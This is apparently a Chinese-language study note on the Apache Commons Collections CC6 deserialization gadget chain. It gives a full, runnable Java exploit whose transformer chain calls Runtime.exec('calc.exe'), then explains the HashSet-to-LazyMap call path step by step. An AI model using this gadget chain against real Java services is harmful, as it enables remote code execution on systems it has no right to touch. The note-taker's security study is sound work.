---
title: CC6链
date: 2026-03-28
updated: 2026-03-28
tags:
  - 链子
categories:
  - 链子
description: CC6链
published: true
---
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6Exp {

    public static void main(String[] args) throws Exception {

        // 构造核心的恶意执行链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 使用一个无害的 Transformer 作为替身
        Transformer fakeTransformer = new ConstantTransformer(1);

        // 构造 LazyMap 和 TiedMapEntry
        // 注意：这里先传入的是 fakeTransformer
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, fakeTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");

        // 构造入口 HashSet，并将 TiedMapEntry 塞进去
        // 这一步在执行 hashSet.add() 时，会立刻在本地触发完整的调用链：
        // add -> put -> hash -> hashCode -> getValue -> get -> transform
        // 因为用了 fakeTransformer，所以只会在 lazyMap 里安全地生成一个 key 为 "foo"，value 为 1 的键值对。
        HashSet hashSet = new HashSet(1);
        hashSet.add(tiedMapEntry);

        // 1. 把 LazyMap 里的 fakeTransformer 替换成真正的 transformerChain
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformerChain);

        // 2. 把刚刚在 add() 时生成的无害键值对给删掉
        // 因为 LazyMap.get() 的逻辑是：如果 map 里没有这个 key，才会去调用 factory.transform()。
        // 如果不删掉，反序列化时 lazyMap 发现 "foo" 已经存在了，就会直接返回 1
        lazyMap.remove("foo");


        byte[] bytes = serialize(hashSet);
        System.out.println("序列化完成，准备触发反序列化...");
        unserialize(bytes);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

当对一个 `HashSet` 进行反序列化（`readObject`）时，它需要把数据重新放回集合里。`HashSet` 底层其实是一个 `HashMap`，所以它会调用 `HashMap.put()` 来恢复数据。

在 `HashMap` 中放入元素时，必须计算元素的哈希值以确定存储位置。所以 `put()` 方法会自动调用传入对象的 `hashCode()` 方法。

这里的 `map.put(e, PRESENT)` 会调用 `TiedMapEntry` 的 `hashCode` 方法

![[attachments/20260328202312.png]]

这里会调用 `key.hashCode()`，而 key 就是 `tiedMapEntry` 对象。

![[attachments/20260328202449.png]]

把 CC5 中用过的 `TiedMapEntry` 塞进 `HashSet` 里。当 `HashMap` 调用 `TiedMapEntry.hashCode()` 时，会发现 `TiedMapEntry` 为了计算哈希值，内部自动调用了 `this.getValue()`。

![[attachments/20260328202520.png]]

这里的 `map` 是 `lazyMap`，`key` 是 `"foo"`

![[attachments/20260328202548.png]]

后面和之前就一样了

```
ois.readObject() <=> ObjectInputStream.readObject()
HashSet::readObject()
	->HashMap::put()
	->HashMap::hash()
	->TiedMapEntry::hashCode()
	->TiedMapEntry::getValue()
	->LazyMap::get()
	->ChainedTransformer::transform()
	->ConstantTransformer::transform()
	->InvokerTransformer::transform()
```